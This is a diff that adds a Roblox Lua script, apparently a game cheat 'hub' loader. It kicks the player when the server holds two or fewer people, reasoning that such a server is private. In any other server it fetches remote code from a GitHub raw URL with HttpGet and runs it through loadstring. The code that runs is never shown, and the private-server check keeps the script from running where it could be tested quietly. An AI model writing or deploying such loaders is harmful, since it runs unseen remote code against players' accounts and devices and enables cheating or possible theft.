@@ -1,0 +1,35 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Function to check if the server has a maximum of 2 players (potentially a private server)
+local function checkIfPrivateServer()
+    local playerCount = #Players:GetPlayers()
+    if LocalPlayer and playerCount <= 2 then
+        -- If there are 1 or 2 players, it's likely a private server
+        LocalPlayer:Kick("NOT WORKING ON PRIVATE SERVER🚨")
+        return true
+    end
+    return false
+end
+
+-- Ensure LocalPlayer is fully loaded
+repeat wait() until LocalPlayer
+
+-- Check if it's a private server before executing the loadstring
+if not checkIfPrivateServer() then
+    -- Wait for a few seconds after the game loads to ensure all players are counted
+    wait(5)
+    -- Recheck in case a player joined later
+    checkIfPrivateServer()
+    
+    -- Execute loadstring if not in a private server
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/iwantsom3/script/main/V3xadoHubV.2"))()
+end
+
+-- If a player joins later, check again
+Players.PlayerAdded:Connect(function()
+    if checkIfPrivateServer() then
+        -- Optionally, you can handle what happens if a player joins and it's still a private server
+        -- For example, you might want to recheck or do nothing
+    end
+end)
